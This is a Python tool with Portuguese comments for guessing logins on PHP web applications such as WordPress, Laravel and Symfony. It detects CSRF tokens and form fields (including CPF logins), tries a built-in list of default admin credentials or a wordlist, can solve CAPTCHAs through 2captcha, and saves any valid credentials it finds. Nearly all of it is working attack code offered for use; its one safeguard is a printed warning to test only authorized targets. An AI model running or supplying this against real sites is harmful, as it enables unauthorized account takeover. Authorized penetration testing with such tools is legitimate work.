#!/usr/bin/env python3
"""
php_login.py — Handler de autenticação PHP para testes de segurança

PHP usa:
  - GET na página de login → captura cookies + CSRF token
  - POST com application/x-www-form-urlencoded (não JSON)
  - Sessão via cookie PHPSESSID
  - Sucesso = redirect 302 para dashboard/admin

Frameworks detectados:
  - Laravel  → campo _token
  - Symfony  → campo _csrf_token
  - WordPress → campo _wpnonce + log/pwd
  - CodeIgniter → campo csrf_token / csrf_hash
  - CakePHP  → campo _csrfToken
  - PHP puro → qualquer hidden input com "token" no nome

Uso como módulo:
  from php_login import PHPLoginHandler
  handler = PHPLoginHandler("https://alvo.com/login")
  sessao  = handler.autenticar("admin", "senha123")
  if sessao:
      requests_autenticados = sessao.session

Uso via CLI (teste de credenciais):
  python3 php_login.py --url https://alvo.com/login --user admin --pass senha
  python3 php_login.py --url https://alvo.com/wp-login.php --wordlist senhas.txt
"""

from __future__ import annotations

import argparse
import re
import sys
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Optional
from urllib.parse import urljoin, urlparse

try:
    import requests
    from requests import Session
    requests.packages.urllib3.disable_warnings()
except ImportError:
    print("[✘] pip install requests")
    sys.exit(1)

try:
    from bs4 import BeautifulSoup
    _BS4_OK = True
except ImportError:
    _BS4_OK = False  # fallback para regex

try:
    from cpf_utils import (
        detectar_campo_cpf, detectar_formato_cpf,
        formatar_cpf, validar_cpf, credenciais_cpf,
        CPFS_TESTE,
    )
    _CPF_OK = True
except ImportError:
    _CPF_OK = False


# ── credenciais padrão para PHP ───────────────────────────────
CREDENCIAIS_PHP = [
    ("admin",          "admin"),
    ("admin",          ""),
    ("admin",          "password"),
    ("admin",          "admin123"),
    ("admin",          "123456"),
    ("admin",          "Admin@123"),
    ("administrator",  "administrator"),
    ("admin",          "admin@123"),
    ("root",           "root"),
    ("root",           "toor"),
    ("test",           "test"),
    ("guest",          "guest"),
    ("user",           "user"),
    ("demo",           "demo"),
    ("admin",          "letmein"),
    ("admin",          "qwerty"),
    ("admin",          "pass"),
]

# ── campos de formulário por framework ────────────────────────
CAMPOS_USUARIO = [
    "username", "user", "email", "login",
    "log",            # WordPress
    "usuario", "user_login", "user_email",
    "_username",      # Symfony
    "username_or_email",
]

CAMPOS_SENHA = [
    "password", "pass", "senha", "pwd",
    "pwd",
    "user_pass",      # WordPress
    "_password",      # Symfony
    "user_password",
]

# ── indicadores de sucesso PHP ────────────────────────────────
SUCESSO_COOKIES = ["PHPSESSID", "laravel_session", "ci_session",
                   "symfony", "wordpress_logged_in", "wp-settings-"]

SUCESSO_URLS    = ["dashboard", "admin", "painel", "home", "index",
                   "profile", "logged", "member", "area"]

FALHA_TEXTOS    = ["inválid", "incorret", "wrong", "failed", "erro",
                   "invalid", "incorrect", "unauthorized",
                   "senha incorreta", "usuário não encontrado",
                   "login failed", "authentication failed"]


@dataclass
class ResultadoLogin:
    sucesso:     bool
    usuario:     str
    senha:       str
    url_final:   str = ""
    cookies:     dict = field(default_factory=dict)
    session:     Optional[Session] = None
    framework:   str = ""
    evidencia:   str = ""


class PHPLoginHandler:
    """
    Gerencia login em aplicações PHP de forma genérica.
    Detecta automaticamente o framework e extrai o CSRF token.
    """

    def __init__(
        self,
        url_login: str,
        delay: float = 1.5,
        timeout: int = 15,
        verbose: bool = True,
        captcha_solver=None,
    ):
        self.url_login      = url_login
        self.delay          = delay
        self.timeout        = timeout
        self.verbose        = verbose
        self.captcha_solver = captcha_solver

        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) "
                          "AppleWebKit/537.36 (KHTML, like Gecko) "
                          "Chrome/120.0.0.0 Safari/537.36",
            "Accept-Language": "pt-BR,pt;q=0.9,en;q=0.8",
        })

        self._framework     = ""
        self._csrf_name     = ""
        self._csrf_value    = ""
        self._campo_usuario = ""
        self._campo_senha   = ""
        self._is_cpf        = False
        self._formato_cpf   = "ambos"

    def _log(self, msg: str) -> None:
        if self.verbose:
            print(f"  {msg}")

    # ─────────────────────────────────────────────────────────
    #  Passo 1: GET na página de login
    # ─────────────────────────────────────────────────────────

    def preparar(self) -> bool:
        """
        Faz GET na página de login, detecta framework e extrai CSRF token.
        Retorna True se a página foi carregada com sucesso.
        """
        try:
            resp = self.session.get(
                self.url_login, timeout=self.timeout,
                allow_redirects=True
            )
            if resp.status_code not in (200, 301, 302):
                self._log(f"[✘] Página de login retornou {resp.status_code}")
                return False

            html = resp.text
            self._detectar_framework(html)
            self._extrair_csrf(html)
            self._detectar_campos_form(html)
            return True

        except Exception as e:
            self._log(f"[✘] Erro ao acessar página de login: {e}")
            return False

    def _detectar_framework(self, html: str) -> None:
        """Identifica o framework PHP pelo HTML da página."""
        checks = {
            "WordPress":    ["wp-login", "wp-content", "WordPress"],
            "Laravel":      ["_token", "laravel", "csrf-token"],
            "Symfony":      ["_csrf_token", "symfony", "sf-toolbar"],
            "CodeIgniter":  ["ci_csrf_token", "csrf_hash", "CodeIgniter"],
            "CakePHP":      ["_csrfToken", "cake", "CakePHP"],
            "Joomla":       ["Joomla", "joomla", "mosConfig"],
            "Drupal":       ["Drupal", "drupal", "form_token"],
        }
        for fw, sinais in checks.items():
            if any(s in html for s in sinais):
                self._framework = fw
                self._log(f"[→] Framework detectado: {fw}")
                return
        self._framework = "PHP puro"
        self._log("[→] Framework: PHP puro (ou desconhecido)")

    def _extrair_csrf(self, html: str) -> None:
        """Extrai nome e valor do CSRF token do formulário."""
        # padrões por framework
        padroes_nome_valor = [
            # <input type="hidden" name="_token" value="abc...">
            r'<input[^>]+name=["\'](_token)["\'][^>]+value=["\']([^"\']+)["\']',
            r'<input[^>]+value=["\']([^"\']+)["\'][^>]+name=["\'](_token)["\']',
            # Laravel / genérico
            r'<input[^>]+name=["\'](_csrf_token)["\'][^>]+value=["\']([^"\']+)["\']',
            # Symfony
            r'<input[^>]+name=["\']([a-z_]*csrf[a-z_]*)["\'][^>]+value=["\']([^"\']+)["\']',
            r'<input[^>]+value=["\']([^"\']+)["\'][^>]+name=["\']([a-z_]*csrf[a-z_]*)["\']',
            # WordPress
            r'<input[^>]+name=["\'](_wpnonce)["\'][^>]+value=["\']([^"\']+)["\']',
            r'<input[^>]+value=["\']([^"\']+)["\'][^>]+name=["\'](_wpnonce)["\']',
            # CakePHP
            r'<input[^>]+name=["\'](_csrfToken)["\'][^>]+value=["\']([^"\']+)["\']',
            # genérico: qualquer hidden com "token" no nome
            r'<input[^>]+type=["\']hidden["\'][^>]+name=["\']([^"\']*token[^"\']*)["\'][^>]+value=["\']([^"\']+)["\']',
            r'<input[^>]+type=["\']hidden["\'][^>]+value=["\']([^"\']{20,})["\'][^>]+name=["\']([^"\']*token[^"\']*)["\']',
        ]

        for padrao in padroes_nome_valor:
            m = re.search(padrao, html, re.IGNORECASE | re.DOTALL)
            if m:
                g1, g2 = m.group(1), m.group(2)
                # determina qual grupo é nome e qual é valor
                if any(kw in g1.lower() for kw in ["token", "csrf", "nonce"]):
                    self._csrf_name, self._csrf_value = g1, g2
                else:
                    self._csrf_name, self._csrf_value = g2, g1

                self._log(f"[→] CSRF token: {self._csrf_name}={self._csrf_value[:20]}...")
                return

        # meta tag (Laravel)
        m = re.search(r'<meta[^>]+name=["\']csrf-token["\'][^>]+content=["\']([^"\']+)["\']', html)
        if m:
            self._csrf_name  = "_token"
            self._csrf_value = m.group(1)
            self._log(f"[→] CSRF via meta: {self._csrf_value[:20]}...")
            return

        self._log("[→] Sem CSRF token detectado")

    def _detectar_campos_form(self, html: str) -> None:
        """Detecta os nomes dos campos de usuário e senha no formulário."""
        # ── detectar campo CPF primeiro ───────────────────────
        if _CPF_OK:
            campo_cpf = detectar_campo_cpf(html)
            if campo_cpf:
                self._campo_usuario = campo_cpf
                self._formato_cpf   = detectar_formato_cpf(html)
                self._is_cpf        = True
                self._log(f"[→] Login por CPF detectado — campo: '{campo_cpf}' formato: {self._formato_cpf}")
                # ainda precisa detectar o campo de senha
                for campo in CAMPOS_SENHA:
                    if f'name="{campo}"' in html or f"name='{campo}'" in html:
                        self._campo_senha = campo
                        break
                if not self._campo_senha:
                    m = re.search(
                        r'<input[^>]+type=["\']password["\'][^>]+name=["\']([^"\']+)["\']',
                        html
                    ) or re.search(
                        r'<input[^>]+name=["\']([^"\']+)["\'][^>]+type=["\']password["\']',
                        html
                    )
                    if m:
                        self._campo_senha = m.group(1)
                return

        # campo usuário (sem CPF)
        for campo in CAMPOS_USUARIO:
            if f'name="{campo}"' in html or f"name='{campo}'" in html:
                self._campo_usuario = campo
                break

        # campo senha
        for campo in CAMPOS_SENHA:
            if f'name="{campo}"' in html or f"name='{campo}'" in html:
                self._campo_senha = campo
                break

        # fallback: procura input type=password
        if not self._campo_senha:
            m = re.search(r'<input[^>]+type=["\']password["\'][^>]+name=["\']([^"\']+)["\']', html)
            if not m:
                m = re.search(r'<input[^>]+name=["\']([^"\']+)["\'][^>]+type=["\']password["\']', html)
            if m:
                self._campo_senha = m.group(1)

        # fallback usuário
        if not self._campo_usuario:
            m = re.search(r'<input[^>]+type=["\'](?:text|email)["\'][^>]+name=["\']([^"\']+)["\']', html)
            if m:
                self._campo_usuario = m.group(1)

        self._log(f"[→] Campos: usuário='{self._campo_usuario or '?'}' senha='{self._campo_senha or '?'}'")
        self._is_cpf = False

    # ─────────────────────────────────────────────────────────
    #  Passo 2: POST de login
    # ─────────────────────────────────────────────────────────

    def autenticar(self, usuario: str, senha: str) -> Optional[ResultadoLogin]:
        """
        Tenta autenticar com as credenciais fornecidas.
        Retorna ResultadoLogin com sucesso=True se autenticou.
        """
        # monta o body do form
        campo_user = self._campo_usuario or "username"
        campo_pass = self._campo_senha   or "password"

        # formatar usuário como CPF se detectado
        usuario_formatado = usuario
        if self._is_cpf and _CPF_OK and validar_cpf(usuario):
            if self._formato_cpf == "mascarado":
                usuario_formatado = formatar_cpf(usuario, com_mascara=True)
            elif self._formato_cpf == "numerico":
                usuario_formatado = formatar_cpf(usuario, com_mascara=False)
            else:
                # "ambos" — tenta primeiro com máscara
                usuario_formatado = formatar_cpf(usuario, com_mascara=True)

        dados = {
            campo_user: usuario_formatado,
            campo_pass: senha,
        }

        # WordPress usa campos específicos
        if self._framework == "WordPress":
            dados = {
                "log":       usuario,
                "pwd":       senha,
                "wp-submit": "Log In",
                "redirect_to": "/wp-admin/",
                "testcookie": "1",
            }

        # adiciona CSRF token se encontrado
        if self._csrf_name and self._csrf_value:
            dados[self._csrf_name] = self._csrf_value

        # adiciona campos extras comuns
        dados.setdefault("submit",   "Login")
        dados.setdefault("remember", "1")

        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Referer":      self.url_login,
            "Origin":       f"{urlparse(self.url_login).scheme}://{urlparse(self.url_login).netloc}",
        }

        try:
            resp = self.session.post(
                self.url_login,
                data=dados,           # form-urlencoded, não json=
                headers=headers,
                timeout=self.timeout,
                allow_redirects=True,
            )

            return self._avaliar_resposta(resp, usuario, senha)

        except requests.exceptions.ConnectionError:
            self._log(f"[✘] Conexão recusada: {self.url_login}")
            return None
        except Exception as e:
            self._log(f"[✘] Erro no POST: {e}")
            return None

    def _avaliar_resposta(
        self, resp: requests.Response, usuario: str, senha: str
    ) -> ResultadoLogin:
        """Determina se o login foi bem-sucedido."""
        cookies_atuais = dict(self.session.cookies)
        url_final      = resp.url
        html           = resp.text.lower()

        # ── indicadores de sucesso ────────────────────────────

        # 1. cookie de sessão PHP presente
        for cookie in SUCESSO_COOKIES:
            if any(cookie.lower() in k.lower() for k in cookies_atuais):
                return ResultadoLogin(
                    sucesso=True, usuario=usuario, senha=senha,
                    url_final=url_final, cookies=cookies_atuais,
                    session=self.session, framework=self._framework,
                    evidencia=f"Cookie de sessão encontrado: {cookie}"
                )

        # 2. redirecionou para URL de sucesso
        for url_suc in SUCESSO_URLS:
            if url_suc in url_final.lower():
                return ResultadoLogin(
                    sucesso=True, usuario=usuario, senha=senha,
                    url_final=url_final, cookies=cookies_atuais,
                    session=self.session, framework=self._framework,
                    evidencia=f"Redirecionado para: {url_final}"
                )

        # 3. não tem texto de erro no HTML
        tem_erro = any(f in html for f in FALHA_TEXTOS)
        # e não voltou para a página de login
        voltou_login = any(kw in url_final.lower() for kw in ["login", "signin", "auth"])

        if not tem_erro and not voltou_login and resp.status_code == 200:
            return ResultadoLogin(
                sucesso=True, usuario=usuario, senha=senha,
                url_final=url_final, cookies=cookies_atuais,
                session=self.session, framework=self._framework,
                evidencia=f"Sem texto de erro, URL: {url_final}"
            )

        return ResultadoLogin(
            sucesso=False, usuario=usuario, senha=senha,
            url_final=url_final, framework=self._framework
        )

    # ─────────────────────────────────────────────────────────
    #  Teste de múltiplas credenciais
    # ─────────────────────────────────────────────────────────

    def testar_lista(
        self,
        credenciais: list[tuple[str, str]],
        output_dir: Path = Path("."),
    ) -> list[ResultadoLogin]:
        """
        Testa uma lista de credenciais com renovação de CSRF entre tentativas.
        """
        hits = []
        output_dir.mkdir(parents=True, exist_ok=True)
        resultado_file = output_dir / "php_login_findings.txt"
        total = len(credenciais)
        rate_limited = False

        print(f"\n[→] {total} credenciais para testar em: {self.url_login}")
        print(f"[→] Framework: {self._framework}")
        print(f"[→] CSRF: {'sim (' + self._csrf_name + ')' if self._csrf_name else 'não detectado'}")
        print(f"[→] Campo usuário: {self._campo_usuario or 'desconhecido'}")
        print(f"[→] Campo senha: {self._campo_senha or 'desconhecido'}")
        print()

        for i, (usuario, senha) in enumerate(credenciais, 1):
            if rate_limited:
                break

            sys.stdout.write(f"\r  [{i:3}/{total}] {usuario}:{senha[:15]:<15}  ")
            sys.stdout.flush()

            # renovar CSRF antes de cada tentativa
            # (muitos frameworks invalidam o token após uso)
            if self._csrf_name and i > 1:
                self.session = requests.Session()
                self.session.verify = False
                self.session.headers.update({"User-Agent": "Mozilla/5.0"})
                self.preparar()

            resultado = self.autenticar(usuario, senha)

            if resultado is None:
                continue

            # detectar rate limiting
            if resultado.url_final and any(
                kw in resultado.url_final.lower()
                for kw in ["blocked", "captcha", "locked", "too-many"]
            ):
                print(f"\n  [!] Possível rate limit / bloqueio detectado")
                rate_limited = True

            if resultado.sucesso:
                hits.append(resultado)
                print(f"\n  [✔] CREDENCIAL VÁLIDA: {usuario}:{senha}")
                print(f"      URL final: {resultado.url_final}")
                print(f"      Evidência: {resultado.evidencia}")
                print(f"      Cookies: {list(resultado.cookies.keys())}")

                with open(resultado_file, "a") as f:
                    f.write(f"{'='*60}\n")
                    f.write(f"URL      : {self.url_login}\n")
                    f.write(f"Framework: {self._framework}\n")
                    f.write(f"Usuário  : {usuario}\n")
                    f.write(f"Senha    : {senha}\n")
                    f.write(f"URL final: {resultado.url_final}\n")
                    f.write(f"Evidência: {resultado.evidencia}\n")
                    f.write(f"Cookies  : {list(resultado.cookies.keys())}\n\n")

            time.sleep(self.delay)

        print()
        return hits


# ─────────────────────────────────────────────────────────────
#  CLI — uso direto
# ─────────────────────────────────────────────────────────────
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Teste de login PHP")
    parser.add_argument("--url",      required=True, help="URL da página de login PHP")
    parser.add_argument("--user",     default="",    help="Usuário único para testar")
    parser.add_argument("--password", default="",    help="Senha única para testar")
    parser.add_argument("--wordlist", default="",    help="Arquivo de senhas (uma por linha)")
    parser.add_argument("--delay",    type=float, default=1.5)
    parser.add_argument("--output",   default="./security-reports")
    parser.add_argument("--captcha-modo", default="skip",
                        choices=["skip", "manual", "2captcha"],
                        help="Como resolver CAPTCHAs")
    parser.add_argument("--captcha-key", default="")
    args = parser.parse_args()

    OUTPUT = Path(args.output)

    # CAPTCHA solver
    captcha = None
    if args.captcha_modo != "skip":
        try:
            from captcha_solver import CaptchaSolver
            captcha = CaptchaSolver(modo=args.captcha_modo,
                                    api_key=args.captcha_key)
        except ImportError:
            print("[!] captcha_solver.py não encontrado")

    print(f"\n{'═'*55}")
    print(f"  PHP Login Tester")
    print(f"  URL: {args.url}")
    print(f"{'═'*55}")
    print("  ⚠ Só em alvos com autorização escrita.")
    print(f"{'═'*55}")

    handler = PHPLoginHandler(
        url_login      = args.url,
        delay          = args.delay,
        captcha_solver = captcha,
    )

    # preparar (GET + extrair CSRF + detectar campos)
    if not handler.preparar():
        print("[✘] Não foi possível acessar a página de login.")
        sys.exit(1)

    # definir credenciais a testar
    if args.user and args.password:
        credenciais = [(args.user, args.password)]
    elif args.wordlist:
        senhas = Path(args.wordlist).read_text(errors="ignore").splitlines()
        usuarios = [args.user] if args.user else ["admin", "root", "user"]
        credenciais = [(u, s.strip()) for u in usuarios for s in senhas if s.strip()]
    else:
        credenciais = CREDENCIAIS_PHP

    hits = handler.testar_lista(credenciais, output_dir=OUTPUT)

    print(f"\n{'═'*55}")
    print(f"  Credenciais testadas: {len(credenciais)}")
    print(f"  Hits: {len(hits)}")
    if hits:
        print(f"  Relatório: {OUTPUT}/php_login_findings.txt")
    print(f"{'═'*55}")
